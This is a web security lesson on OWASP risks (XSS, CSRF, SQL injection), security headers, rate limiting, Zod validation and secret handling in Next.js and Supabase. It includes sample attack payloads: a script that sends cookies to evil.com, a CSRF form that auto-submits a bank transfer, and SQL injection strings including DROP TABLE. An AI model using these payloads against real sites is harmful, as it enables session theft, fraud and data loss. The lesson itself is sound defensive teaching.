OWASP Top 10: The Most Critical Risks

The OWASP (Open Web Application Security Project) Top 10 is the definitive list of the most critical security risks for web applications. It is updated every few years based on real attack data from thousands of organizations. Think of it as the "most common ways hackers break into websites."

XSS (Cross-Site Scripting)

Cross-Site Scripting (XSS) is an attack where a hacker injects malicious JavaScript code into a web page that other users see. When the victim's browser loads the page, it executes the attacker's code as if it were legitimate -- because the browser trusts code that comes from the same domain.

What Can an XSS Attack Do?

  • Steal session cookies (if not HttpOnly) and impersonate the user
  • Redirect users to phishing pages that look like your site
  • Read sensitive data displayed on the page
  • Modify the page content to show fake information
  • Capture keystrokes including passwords being typed

Types of XSS

Stored XSS (Persistent): The malicious script is saved in the database (e.g., in a blog comment or user profile) and served to every user who views that content.

// Attacker submits this as a "blog comment":
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

// If the server stores it and later renders it without escaping:
<div class="comment">
  <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
</div>
// Every user who views this page now sends their cookies to the attacker!

Reflected XSS (Non-Persistent): The malicious script is part of the URL and gets reflected back in the response. The attacker tricks the victim into clicking a crafted link.

// Attacker sends victim this URL:
https://yoursite.com/search?q=<script>alert('hacked')</script>

// If the server includes the query in the response without escaping:
<p>Search results for: <script>alert('hacked')</script></p>

XSS Prevention

1. Output Encoding (Escaping): Convert special characters to their HTML entity equivalents so they are displayed as text, not executed as code:

// Dangerous: inserting raw HTML
element.innerHTML = userInput;
// If userInput is "<script>alert('xss')</script>"
// The browser EXECUTES the script!

// Safe: using textContent (automatically escapes)
element.textContent = userInput;
// The browser DISPLAYS "<script>alert('xss')</script>" as text

2. React's Built-In Protection: React automatically escapes values in JSX. This is one of React's biggest security benefits:

// React automatically escapes this -- SAFE
const userInput = '<script>alert("xss")</script>';
return <p>{userInput}</p>;
// Renders: <p>&lt;script&gt;alert("xss")&lt;/script&gt;</p>
// The script is displayed as text, not executed

// DANGER: dangerouslySetInnerHTML bypasses React's protection
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
// The script EXECUTES! Never use this with untrusted data.
Never use dangerouslySetInnerHTML with user-provided content. The name literally has "dangerous" in it for a reason. If you must render HTML (e.g., from a Markdown editor), use a sanitization library like DOMPurify to strip malicious tags first.

3. Content Security Policy (CSP) Header: A CSP header tells the browser which sources of scripts, styles, and other resources are trusted. Scripts from untrusted sources are blocked:

// Only allow scripts from your own domain
Content-Security-Policy: script-src 'self'

// Allow scripts from your domain and specific CDNs
Content-Security-Policy: script-src 'self' https://cdn.example.com

CSRF (Cross-Site Request Forgery)

Cross-Site Request Forgery (CSRF) tricks a user's browser into making a request to your site without their knowledge or consent. Because the browser automatically includes cookies with every request, the forged request appears to be from the authenticated user.

How CSRF Works

1. User logs into bank.com (session cookie is set) 2. User visits evil.com (in another tab) 3. evil.com has a hidden form: <form action="https://bank.com/transfer" method="POST"> <input type="hidden" name="to" value="attacker" /> <input type="hidden" name="amount" value="10000" /> </form> <script>document.forms[0].submit();</script> 4. Browser sends POST to bank.com WITH the user's session cookie 5. bank.com thinks it's a legitimate request from the user 6. Money is transferred to the attacker!

CSRF Prevention

1. SameSite Cookies (Primary Defense): As we learned in Lesson 29, setting SameSite=Lax or SameSite=Strict on your session cookies prevents them from being sent with cross-origin requests:

// With SameSite=Lax, the bank's session cookie is NOT sent
// when evil.com submits a form to bank.com
cookieStore.set('session', value, {
  sameSite: 'lax',  // Prevents CSRF
});

2. CSRF Tokens: For extra protection (especially for sensitive operations), generate a random token on the server, include it in forms as a hidden field, and verify it when the form is submitted. An attacker's page cannot read or predict the token:

// Server generates a token and includes it in the form
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="random-unique-token-123" />
  <!-- other fields -->
</form>

// Server verifies the token matches what it issued
if (request.body.csrf_token !== expectedToken) {
  return new Response('Invalid CSRF token', { status: 403 });
}

SQL Injection

SQL Injection occurs when an attacker includes SQL code in user input that gets executed by your database. It is one of the oldest and most devastating web attacks.

// VULNERABLE CODE -- string concatenation in SQL
const query = `SELECT * FROM users WHERE email = '${userInput}'`;

// If userInput is: ' OR '1'='1
// The query becomes:
// SELECT * FROM users WHERE email = '' OR '1'='1'
// This returns ALL users because '1'='1' is always true!

// Even worse, if userInput is: '; DROP TABLE users; --
// The query becomes:
// SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
// This DELETES your entire users table!

Prevention: Parameterized Queries

Never build SQL queries by concatenating user input. Use parameterized queries (also called prepared statements) where user input is treated as data, never as SQL code:

// SAFE: Parameterized query -- user input is a parameter, not part of SQL
const { data } = await supabase
  .from('users')
  .select('*')
  .eq('email', userInput);  // Supabase handles parameterization automatically

// The Supabase client NEVER concatenates user input into SQL.
// It sends the query structure and parameters separately.
// No matter what the user types, it's treated as a data value.
Supabase handles this for you. The Supabase JavaScript client uses parameterized queries internally. When you use methods like .eq(), .insert(), .update(), etc., user input is always treated as data, never as SQL code. You would have to deliberately bypass the client to be vulnerable to SQL injection.

Security Headers

Security headers are HTTP response headers that instruct the browser to enable or disable certain security features. They are your first line of defense against many common attacks, and they cost nothing to implement.

Essential Headers

Header Purpose Recommended Value
X-Frame-Options Prevents your site from being embedded in iframes (clickjacking protection) DENY
X-Content-Type-Options Prevents browser from guessing content types (MIME sniffing attack) nosniff
Referrer-Policy Controls how much URL info is sent when navigating to another site strict-origin-when-cross-origin
Permissions-Policy Disables browser features you do not use (camera, microphone, etc.) geolocation=(), microphone=(), camera=()
X-XSS-Protection Legacy XSS filter for older browsers 1; mode=block
Strict-Transport-Security Forces HTTPS for all future requests (HSTS) max-age=31536000; includeSubDomains
Content-Security-Policy Controls which resources the browser can load Varies by application

Implementing Headers in Middleware

// middleware.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

function addSecurityHeaders(response: NextResponse): void {
  // Prevent clickjacking -- no one can embed our site in an iframe
  response.headers.set('X-Frame-Options', 'DENY');

  // Prevent MIME type sniffing
  response.headers.set('X-Content-Type-Options', 'nosniff');

  // Control referrer information
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Disable unnecessary browser features
  response.headers.set(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=(), payment=()'
  );

  // Legacy XSS protection for older browsers
  response.headers.set('X-XSS-Protection', '1; mode=block');
}

export async function middleware(request: NextRequest) {
  const response = NextResponse.next();

  // Add security headers to EVERY response
  addSecurityHeaders(response);

  // ... rest of middleware (auth checks, etc.)
  return response;
}
CSK Connection CSK's middleware.ts sets five security headers on every response via the addSecurityHeaders() function: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Referrer-Policy: strict-origin-when-cross-origin, Permissions-Policy (disabling geolocation, microphone, camera, and payment), and X-XSS-Protection: 1; mode=block.

Rate Limiting

Rate limiting restricts how many requests a user (or IP address) can make in a given time period. Without it, attackers can:

  • Brute force login: Try thousands of password combinations per second
  • Spam forms: Submit your contact form thousands of times
  • DDoS your server: Overwhelm it with requests until it crashes

In-Memory Rate Limiter

A simple but effective approach for single-server deployments:

// lib/rate-limit.ts

// Track requests per IP address
const requestCounts = new Map<string, { count: number; resetTime: number }>();

interface RateLimitConfig {
  windowMs: number;     // Time window in milliseconds
  maxRequests: number;  // Max requests per window
}

export function checkRateLimit(
  ip: string,
  config: RateLimitConfig = { windowMs: 60_000, maxRequests: 10 }
): { allowed: boolean; remaining: number } {
  const now = Date.now();
  const record = requestCounts.get(ip);

  // If no record or window expired, start fresh
  if (!record || now > record.resetTime) {
    requestCounts.set(ip, {
      count: 1,
      resetTime: now + config.windowMs,
    });
    return { allowed: true, remaining: config.maxRequests - 1 };
  }

  // Increment count
  record.count++;

  // Check if over limit
  if (record.count > config.maxRequests) {
    return { allowed: false, remaining: 0 };
  }

  return { allowed: true, remaining: config.maxRequests - record.count };
}

// Clean up old entries periodically (prevent memory leak)
setInterval(() => {
  const now = Date.now();
  for (const [ip, record] of requestCounts) {
    if (now > record.resetTime) {
      requestCounts.delete(ip);
    }
  }
}, 60_000);  // Clean up every minute

Using the Rate Limiter in an API Route

// app/api/contact/route.ts
import { NextRequest, NextResponse } from 'next/server';
import { checkRateLimit } from '@/lib/rate-limit';

export async function POST(request: NextRequest) {
  // Get client IP
  const ip = request.headers.get('x-forwarded-for') || 'unknown';

  // Check rate limit: max 10 requests per minute
  const { allowed, remaining } = checkRateLimit(ip, {
    windowMs: 60_000,
    maxRequests: 10,
  });

  if (!allowed) {
    return NextResponse.json(
      { error: 'Too many requests. Please try again later.' },
      {
        status: 429,
        headers: {
          'Retry-After': '60',  // Tell client when to retry
        },
      }
    );
  }

  // Process the request normally...
}
CSK Connection CSK's contact form API route implements rate limiting with a maximum of 10 requests per minute per IP address. When the limit is exceeded, the API returns a 429 (Too Many Requests) status code with a Retry-After header.

Input Validation with Zod

Never trust data from the client. Even if you have client-side validation, an attacker can bypass it by sending requests directly to your API (using curl, Postman, or their own script). Server-side validation is the only validation that matters for security.

Why Zod?

Zod is a TypeScript-first schema validation library. It lets you define the shape and constraints of your data, validates incoming data against that shape, and gives you fully typed results:

import { z } from 'zod';

// Define the expected shape of contact form data
const contactFormSchema = z.object({
  name: z.string()
    .min(1, 'Name is required')
    .max(100, 'Name must be under 100 characters')
    .trim(),
  email: z.string()
    .email('Please enter a valid email address')
    .toLowerCase(),
  message: z.string()
    .min(10, 'Message must be at least 10 characters')
    .max(5000, 'Message must be under 5000 characters')
    .trim(),
});

// Type is automatically inferred from the schema
type ContactFormData = z.infer<typeof contactFormSchema>;
// { name: string; email: string; message: string; }

Using Zod in API Routes

export async function POST(request: NextRequest) {
  const body = await request.json();

  // Validate the input
  const result = contactFormSchema.safeParse(body);

  if (!result.success) {
    // Validation failed -- return the specific errors
    return NextResponse.json(
      {
        error: 'Validation failed',
        details: result.error.flatten().fieldErrors,
        // { name: ['Name is required'], email: ['Invalid email'] }
      },
      { status: 400 }
    );
  }

  // result.data is now fully validated and typed
  const { name, email, message } = result.data;
  // TypeScript knows these are valid strings

  // Process the validated data safely...
}
safeParse vs parse: Use safeParse() in API routes. It returns a result object with success and error fields instead of throwing an exception. This gives you control over how validation errors are returned to the client. Use parse() when you want to throw on invalid data (e.g., in internal functions where invalid data indicates a bug).

Environment Variable Security

Environment variables store configuration and secrets. In Next.js, there is a critical naming convention that controls which variables are exposed to the browser:

The NEXT_PUBLIC_ Prefix

# These are ONLY available on the server (safe for secrets):
DATABASE_URL=postgres://user:password@host:5432/db
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
SESSION_SECRET=a1b2c3d4e5f6...
RESEND_API_KEY=re_123456789

# These are available in BOTH server AND browser code (not for secrets):
NEXT_PUBLIC_SUPABASE_URL=https://yourproject.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOi...
NEXT_PUBLIC_APP_URL=https://yourdomain.com
The rule: If a variable starts with NEXT_PUBLIC_, it is bundled into the JavaScript that is sent to every user's browser. Anyone can see it. NEVER put secret keys, database passwords, or service role keys in NEXT_PUBLIC_ variables.

The anon key is safe to expose because it respects Row-Level Security policies. The service_role key bypasses RLS entirely and must NEVER be exposed to the browser.

Which Keys Go Where?

Variable Prefix Why
Supabase URL NEXT_PUBLIC_ Browser needs it to connect to Supabase
Supabase Anon Key NEXT_PUBLIC_ Safe because RLS restricts access
Supabase Service Key No prefix Bypasses RLS -- server only
Session Secret No prefix Used for encryption -- server only
API Keys (Resend, etc.) No prefix Secret credentials -- server only
Database URL No prefix Contains password -- server only

Dependency Security

Your application depends on hundreds of npm packages. Each one is code written by someone else that runs in your application. A vulnerability in any dependency is a vulnerability in your application.

npm audit

# Check all dependencies for known vulnerabilities
npm audit

# Automatically fix vulnerabilities (when possible)
npm audit fix

# See detailed information about a specific vulnerability
npm audit --json

Best Practices

  • Run npm audit regularly -- at least before every deployment.
  • Keep dependencies updated -- use npm outdated to see what needs updating.
  • Use exact versions in production -- package-lock.json ensures everyone gets the same versions.
  • Minimize dependencies -- every package you add is more code to trust and maintain.
  • Review before installing -- check the package's download count, last update date, and GitHub issues before adding it.
CSK Connection CSK implements all of these security practices. The middleware.ts sets 5 security headers on every response. The contact API has rate limiting (10 requests per minute). All form inputs are validated with Zod schemas on the server. The NEXT_PUBLIC_ prefix is used only for the Supabase URL and anon key -- all secret keys remain server-only. npm audit is part of the deployment checklist.

Key Takeaways

  • The OWASP Top 10 is your checklist for the most critical web security risks.
  • XSS injects malicious scripts into pages. Prevent it with output encoding, React's auto-escaping, and CSP headers.
  • Never use dangerouslySetInnerHTML with untrusted data -- sanitize first.
  • CSRF tricks browsers into making authenticated requests. Prevent it with SameSite=Lax cookies and CSRF tokens.
  • SQL Injection exploits string concatenation in queries. Supabase's client uses parameterized queries automatically.
  • Set security headers (X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy) in middleware on every response.
  • Rate limiting prevents brute force attacks. A simple in-memory counter with a time window works for single-server deployments.
  • Validate ALL input on the server with Zod. Client-side validation is for UX only.
  • Only NEXT_PUBLIC_ variables are exposed to the browser. Keep all secrets (service keys, database URLs, session secrets) without this prefix.
  • Run npm audit regularly and keep dependencies updated.
